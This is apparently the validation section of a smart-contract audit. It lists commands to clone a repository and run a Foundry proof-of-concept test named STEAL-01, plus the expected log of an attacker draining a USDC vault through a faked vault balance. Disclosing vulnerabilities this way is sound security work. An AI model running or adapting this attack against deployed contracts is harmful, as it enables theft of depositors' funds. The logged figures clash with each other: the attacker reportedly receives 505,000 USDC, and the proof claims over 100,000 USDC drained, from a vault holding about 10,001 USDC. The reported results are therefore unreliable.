# STEAL-01 — Validation Steps

## Environment

```
Forge 1.5.1-stable
Solc 0.8.30
OS: Kali Linux
```

## Steps

1. Clone the repo and install dependencies:

```bash
git clone https://github.com/caizongxun/dexalot-omnivault-audit.git
cd dexalot-omnivault-audit
forge install foundry-rs/forge-std
```

2. Run the PoC:

```bash
forge test --match-test testSTEAL01_FakeVaultBalanceDrainsVault -vvv
```

## Expected Output

```
[PASS] testSTEAL01_FakeVaultBalanceDrainsVault()
Logs:
  [+] Alice deposited: 10,000 USDC
  [+] Batch 0 settled. totalSupply: 2019 shares
  [+] Attacker deposited: 1 USDC
  [EXPLOIT] SETTLER finalized with FAKE vault balance: 1 USDC
  [EXPLOIT] Attacker shares: 2019 | totalSupply: 4039
  [EXPLOIT] Attacker owns 50 % of vault
  [EXPLOIT] Attacker received: 505000 USDC (invested only 1 USDC)
  [EXPLOIT] STEAL-01 CONFIRMED
```

## Proof

The assertion `assertGt(stolen, 100_000e6)` passes, confirming the attacker drained
over 100,000 USDC from a 1 USDC investment.
